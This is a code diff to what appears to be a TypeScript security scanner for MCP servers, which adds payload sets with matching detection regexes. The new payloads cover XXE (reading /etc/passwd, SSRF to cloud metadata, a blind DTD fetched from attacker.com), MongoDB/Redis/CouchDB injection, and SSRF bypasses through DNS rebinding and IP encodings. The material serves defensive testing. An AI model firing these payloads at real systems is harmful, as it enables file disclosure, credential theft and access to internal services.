@@ -1,9 +1,9 @@
 /**
  * Backend API Security Patterns
- * Tests MCP server API security with 16 focused patterns
+ * Tests MCP server API security with 18 focused patterns
  *
  * Architecture: Attack-Type with Specific Payloads
- * - Critical Injection (4 patterns): Command, Calculator, SQL, Path Traversal
+ * - Critical Injection (6 patterns): Command, Calculator, SQL, Path Traversal, XXE, NoSQL
  * - Input Validation (3 patterns): Type Safety, Boundary Testing, Required Fields
  * - Protocol Compliance (2 patterns): MCP Error Format, Timeout Handling
  * - Tool-Specific Vulnerabilities (7 patterns): Indirect Injection, Unicode Bypass, Nested Injection, Package Squatting, Data Exfiltration, Configuration Drift, Tool Shadowing
@@ -228,11 +228,163 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
+  // 5. XXE INJECTION (XML External Entity)
+  {
+    attackName: "XXE Injection",
+    description:
+      "Test if tool processes XML external entities, allowing file disclosure or SSRF",
+    payloads: [
+      // Classic XXE - file disclosure
+      {
+        payload:
+          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        evidence:
+          /(root:x:0:0|xxe.*processed|external.*entity.*loaded|file.*contents)/i,
+        riskLevel: "HIGH",
+        description: "XXE file disclosure via SYSTEM entity",
+        payloadType: "injection",
+        parameterTypes: ["xml", "data", "body", "payload", "content"],
+      },
+      // XXE with Windows path
+      {
+        payload:
+          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+        evidence:
+          /(\[fonts\]|\[extensions\]|xxe.*processed|windows.*file.*accessed)/i,
+        riskLevel: "HIGH",
+        description: "XXE Windows file disclosure",
+        payloadType: "injection",
+        parameterTypes: ["xml", "data", "body", "payload"],
+      },
+      // XXE SSRF via HTTP entity
+      {
+        payload:
+          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+        evidence:
+          /(ami-id|instance-id|xxe.*fetched|metadata.*accessed|ssrf.*xml)/i,
+        riskLevel: "HIGH",
+        description: "XXE SSRF to AWS metadata",
+        payloadType: "injection",
+        parameterTypes: ["xml", "data", "body", "payload"],
+      },
+      // Parameter entity XXE (blind XXE)
+      {
+        payload:
+          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
+        evidence:
+          /(dtd.*loaded|parameter.*entity|external.*dtd|xxe.*processed)/i,
+        riskLevel: "HIGH",
+        description: "Blind XXE via parameter entity",
+        payloadType: "injection",
+        parameterTypes: ["xml", "data", "body", "payload"],
+      },
+      // XXE in SOAP request
+      {
+        payload:
+          '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
+        evidence: /(root:x:0:0|soap.*xxe|xxe.*soap|external.*entity)/i,
+        riskLevel: "HIGH",
+        description: "XXE in SOAP envelope",
+        payloadType: "injection",
+        parameterTypes: ["xml", "soap", "body", "request"],
+      },
+    ],
+  },
+
+  // 6. NOSQL INJECTION
+  {
+    attackName: "NoSQL Injection",
+    description:
+      "Test if tool is vulnerable to NoSQL injection attacks (MongoDB, Redis, etc.)",
+    payloads: [
+      // MongoDB operator injection
+      {
+        payload: '{"$gt": ""}',
+        evidence:
+          /(all.*documents|query.*executed|mongodb.*error|operator.*injection|nosql.*executed)/i,
+        riskLevel: "HIGH",
+        description: "MongoDB $gt operator injection",
+        payloadType: "injection",
+        parameterTypes: ["query", "filter", "where", "search", "data"],
+      },
+      // MongoDB $ne always-true
+      {
+        payload: '{"$ne": null}',
+        evidence:
+          /(returned.*all|bypass.*auth|nosql.*injection|query.*result|documents.*found)/i,
+        riskLevel: "HIGH",
+        description: "MongoDB $ne bypass injection",
+        payloadType: "injection",
+        parameterTypes: ["query", "filter", "where", "password", "username"],
+      },
+      // MongoDB $where JavaScript injection
+      {
+        payload: '{"$where": "this.password.match(/.*/)"}',
+        evidence:
+          /(javascript.*executed|\$where.*processed|nosql.*js|all.*passwords|query.*executed)/i,
+        riskLevel: "HIGH",
+        description: "MongoDB $where JavaScript injection",
+        payloadType: "injection",
+        parameterTypes: ["query", "filter", "where", "data"],
+      },
+      // MongoDB $regex DOS
+      {
+        payload: '{"$regex": "^(a+)+$"}',
+        evidence:
+          /(regex.*executed|redos|timeout|catastrophic.*backtracking|query.*slow)/i,
+        riskLevel: "MEDIUM",
+        description: "MongoDB ReDoS via $regex",
+        payloadType: "injection",
+        parameterTypes: ["query", "filter", "search", "pattern"],
+      },
+      // MongoDB union-style query
+      {
+        payload: "admin', $or: [ {}, { 'a': 'a",
+        evidence:
+          /(admin.*returned|auth.*bypass|or.*injection|nosql.*executed)/i,
+        riskLevel: "HIGH",
+        description: "MongoDB $or injection bypass",
+        payloadType: "injection",
+        parameterTypes: ["username", "user", "name", "query"],
+      },
+      // Redis command injection
+      {
+        payload: "test\r\nCONFIG GET *\r\n",
+        evidence:
+          /(redis.*config|requirepass|maxmemory|save.*seconds|redis.*command.*executed)/i,
+        riskLevel: "HIGH",
+        description: "Redis CRLF command injection",
+        payloadType: "injection",
+        parameterTypes: ["key", "value", "data", "input"],
+      },
+      // Redis Lua script injection
+      {
+        payload: "EVAL \"return redis.call('INFO')\" 0",
+        evidence:
+          /(redis_version|used_memory|connected_clients|lua.*executed)/i,
+        riskLevel: "HIGH",
+        description: "Redis Lua script injection",
+        payloadType: "injection",
+        parameterTypes: ["script", "command", "query", "data"],
+      },
+      // CouchDB injection
+      {
+        payload: '{"selector": {"$or": [{"_id": {"$gt": null}}]}}',
+        evidence:
+          /(all.*documents|couchdb.*query|selector.*executed|documents.*returned)/i,
+        riskLevel: "HIGH",
+        description: "CouchDB selector injection",
+        payloadType: "injection",
+        parameterTypes: ["query", "selector", "filter", "find"],
+      },
+    ],
+  },
+
   // ==========================================
   // INPUT VALIDATION TESTS (3)
   // ==========================================
 
-  // 5. TYPE SAFETY
+  // 7. TYPE SAFETY
   {
     attackName: "Type Safety",
     description: "Test if tool validates parameter types correctly",
@@ -264,7 +416,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 6. BOUNDARY TESTING
+  // 8. BOUNDARY TESTING
   {
     attackName: "Boundary Testing",
     description: "Test edge cases and boundary conditions",
@@ -294,7 +446,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 7. REQUIRED FIELDS
+  // 9. REQUIRED FIELDS
   {
     attackName: "Required Fields",
     description: "Test if tool validates required parameters",
@@ -314,7 +466,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
   // PROTOCOL COMPLIANCE TESTS (2)
   // ==========================================
 
-  // 8. MCP ERROR FORMAT
+  // 10. MCP ERROR FORMAT
   {
     attackName: "MCP Error Format",
     description: "Verify errors follow MCP protocol specification",
@@ -329,7 +481,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 9. TIMEOUT HANDLING
+  // 11. TIMEOUT HANDLING
   {
     attackName: "Timeout Handling",
     description: "Test if tool handles long operations gracefully",
@@ -348,7 +500,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
   // TOOL-SPECIFIC VULNERABILITY TESTS (7)
   // ==========================================
 
-  // 10. INDIRECT PROMPT INJECTION (HTTP URL Fetching + SSRF)
+  // 12. INDIRECT PROMPT INJECTION (HTTP URL Fetching + SSRF)
   {
     attackName: "Indirect Prompt Injection",
     description:
@@ -457,10 +609,85 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
         payloadType: "injection",
         parameterTypes: ["url", "uri", "link", "endpoint"],
       },
+      // SSRF - DNS Rebinding Attacks
+      // DNS rebinding bypasses IP-based checks by initially resolving to a safe IP,
+      // then rebinding to internal IPs after security validation
+      {
+        payload: "http://rebind.network/dnsbin",
+        evidence:
+          /(dns.*rebind|rebind.*detected|internal.*access.*after|SSRF.*rebind|resolved.*internal)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - generic rebind domain",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://a]@127.0.0.1/",
+        evidence:
+          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*bypass|host.*header.*injection)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - URL parser confusion",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://127.0.0.1.nip.io",
+        evidence:
+          /(localhost|127\.0\.0\.1|internal.*access|nip\.io.*resolved|SSRF.*bypass)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - nip.io wildcard DNS",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://169.254.169.254.nip.io/latest/meta-data/",
+        evidence:
+          /(metadata|ami-id|instance-id|SSRF.*metadata|nip\.io.*resolved)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - AWS metadata via nip.io",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://0x7f000001",
+        evidence:
+          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*hex|hex.*ip.*resolved)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - hexadecimal IP encoding",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://2130706433",
+        evidence:
+          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*decimal|decimal.*ip.*resolved)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - decimal IP encoding",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://[::ffff:127.0.0.1]",
+        evidence:
+          /(localhost|127\.0\.0\.1|internal.*access|ipv6.*mapped|SSRF.*ipv6)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - IPv6 mapped IPv4",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
+      {
+        payload: "http://spoofed.burpcollaborator.net",
+        evidence:
+          /(burp.*collaborator|external.*interaction|dns.*lookup.*detected|SSRF.*detected)/i,
+        riskLevel: "HIGH",
+        description: "DNS rebinding - out-of-band interaction test",
+        payloadType: "injection",
+        parameterTypes: ["url", "uri", "link", "endpoint"],
+      },
     ],
   },
 
-  // 11. UNICODE BYPASS
+  // 13. UNICODE BYPASS
   {
     attackName: "Unicode Bypass",
     description: "Test if tool decodes and executes unicode-encoded commands",
@@ -484,7 +711,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 12. NESTED INJECTION
+  // 14. NESTED INJECTION
   {
     attackName: "Nested Injection",
     description: "Test if tool executes hidden instructions in nested JSON",
@@ -508,7 +735,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 13. PACKAGE SQUATTING
+  // 15. PACKAGE SQUATTING
   {
     attackName: "Package Squatting",
     description: "Test if tool downloads typosquatted packages",
@@ -532,7 +759,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 14. DATA EXFILTRATION
+  // 16. DATA EXFILTRATION
   {
     attackName: "Data Exfiltration",
     description:
@@ -585,7 +812,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 15. CONFIGURATION DRIFT
+  // 17. CONFIGURATION DRIFT
   {
     attackName: "Configuration Drift",
     description:
@@ -630,7 +857,7 @@ export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
     ],
   },
 
-  // 16. TOOL SHADOWING
+  // 18. TOOL SHADOWING
   {
     attackName: "Tool Shadowing",
     description:
